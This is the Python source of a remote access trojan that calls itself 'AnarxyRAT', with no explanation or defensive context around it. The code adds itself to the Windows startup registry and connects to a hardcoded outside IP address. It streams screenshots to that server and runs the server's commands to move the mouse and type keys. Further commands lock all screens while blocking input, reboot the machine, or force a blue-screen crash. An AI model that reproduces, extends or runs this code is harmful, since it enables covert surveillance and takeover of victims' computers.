import socket
import mss
import cv2
import numpy as np
import pickle
import struct
import threading
import ctypes
import os
import subprocess
import sys
import tkinter as tk
from PIL import Image, ImageTk
from pynput.mouse import Controller as MouseController, Button
from pynput.keyboard import Controller as KeyboardController, Key as PynKey
import platform
import requests
from io import BytesIO

try:
    import winreg
except ImportError:
    winreg = None

# === Setup ===
server_ip = '147.185.221.27'
server_port = 10434

mouse = MouseController()
keyboard = KeyboardController()

keymap = {
    "BACKSPACE": PynKey.backspace, "ENTER": PynKey.enter, "SPACE": PynKey.space,
    "TAB": PynKey.tab, "ESC": PynKey.esc, "SHIFT": PynKey.shift, "CTRL": PynKey.ctrl,
    "ALT": PynKey.alt, "CAPSLOCK": PynKey.caps_lock, "DELETE": PynKey.delete,
    "UP": PynKey.up, "DOWN": PynKey.down, "LEFT": PynKey.left, "RIGHT": PynKey.right
}

# === Persistence: Add rat.py to startup ===
def add_startup_rat_py():
    if platform.system() == "Windows" and winreg:
        try:
            username = os.getlogin()
            download_path = os.path.join("C:\\Users", username, "Downloads", "rat.py")
            command = f'pythonw.exe "{download_path}"'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "AnarxyRAT", 0, winreg.REG_SZ, command)
            winreg.CloseKey(key)
            print("[+] Added to startup successfully.")
        except Exception as e:
            print(f"[!] Failed to add to startup: {e}")

add_startup_rat_py()

# === Lock Screen ===
lock_root = None
lock_overlays = []
lock_img_tk = None

def init_lock_root():
    global lock_root
    lock_root = tk.Tk()
    lock_root.withdraw()
    lock_root.mainloop()

threading.Thread(target=init_lock_root, daemon=True).start()

def on_any_event(e): return "break"

def show_lock_screen_gui():
    global lock_overlays, lock_img_tk, lock_root
    if not lock_img_tk:
        try:
            res = requests.get("https://github.com/Anarxyfr/fdsa/blob/main/Anarxy.png?raw=true")
            image = Image.open(BytesIO(res.content)).resize((300, 300))
            lock_img_tk = ImageTk.PhotoImage(image)
        except:
            lock_img_tk = None

    with mss.mss() as sct:
        monitors = sct.monitors[1:]

    for mon in monitors:
        win = tk.Toplevel(lock_root)
        win.overrideredirect(True)
        win.geometry(f"{mon['width']}x{mon['height']}+{mon['left']}+{mon['top']}")
        win.configure(bg="black")
        win.attributes("-topmost", True)

        win.bind("<Key>", on_any_event)
        win.bind("<Button>", on_any_event)
        win.bind("<Motion>", on_any_event)
        win.bind("<MouseWheel>", on_any_event)

        canvas = tk.Canvas(win, bg="black", highlightthickness=0)
        canvas.pack(fill="both", expand=True)
        canvas.create_text(mon["width"] // 2, int(mon["height"] * 0.25),
                           text="Screen locked by anarxy", fill="white", font=("Arial", 48))

        if lock_img_tk:
            canvas.create_image(mon["width"] // 2, int(mon["height"] * 0.5), image=lock_img_tk)

        lock_overlays.append(win)

    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.BlockInput(True)
        except:
            pass

def hide_lock_screen_gui():
    global lock_overlays
    for w in lock_overlays:
        try:
            w.destroy()
        except:
            pass
    lock_overlays.clear()
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.BlockInput(False)
        except:
            pass

# === Trigger BSOD ===
def trigger_bsod():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except Exception as e:
        print(f"[!] BSOD failed: {e}")

# === RAT Socket Loop ===
s = socket.socket()
s.connect((server_ip, server_port))

with mss.mss() as sct:
    monitor = sct.monitors[1]
    width = monitor["width"]
    height = monitor["height"]

    while True:
        frame = np.array(sct.grab(monitor))
        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
        _, encimg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
        data = pickle.dumps((encimg, width, height))
        s.sendall(struct.pack(">L", len(data)) + data)

        s.settimeout(0.01)
        try:
            raw = s.recv(4, socket.MSG_PEEK)
            if raw:
                cmd_size = struct.unpack(">L", s.recv(4))[0]
                cmd_data = b''
                while len(cmd_data) < cmd_size:
                    cmd_data += s.recv(cmd_size - len(cmd_data))
                cmd = cmd_data.decode()
                parts = cmd.split(":")

                if parts[0] == "MOVE":
                    mouse.position = (int(parts[1]), int(parts[2]))
                elif parts[0] == "CLICK":
                    mouse.click(Button.left if parts[1].upper() == "LEFT" else Button.right)
                elif parts[0] == "SCROLL":
                    mouse.scroll(0, int(parts[1]))
                elif parts[0] == "KEY":
                    k = keymap.get(parts[1].upper(), parts[1].lower())
                    keyboard.press(k)
                    keyboard.release(k)
                elif parts[0] == "XBUTTON":
                    if platform.system() == "Windows":
                        btn = 0x0001 if parts[1] == "1" else 0x0002
                        ctypes.windll.user32.mouse_event(0x0080, 0, 0, btn, 0)
                        ctypes.windll.user32.mouse_event(0x0100, 0, 0, btn, 0)
                elif parts[0] == "LOCKSCREEN" and lock_root:
                    lock_root.after(0, show_lock_screen_gui)
                elif parts[0] == "UNLOCKSCREEN" and lock_root:
                    lock_root.after(0, hide_lock_screen_gui)
                elif parts[0] == "RESTART":
                    subprocess.call("shutdown /r /t 0", shell=True)
                elif parts[0] == "BSOD":
                    trigger_bsod()
        except socket.timeout:
            continue
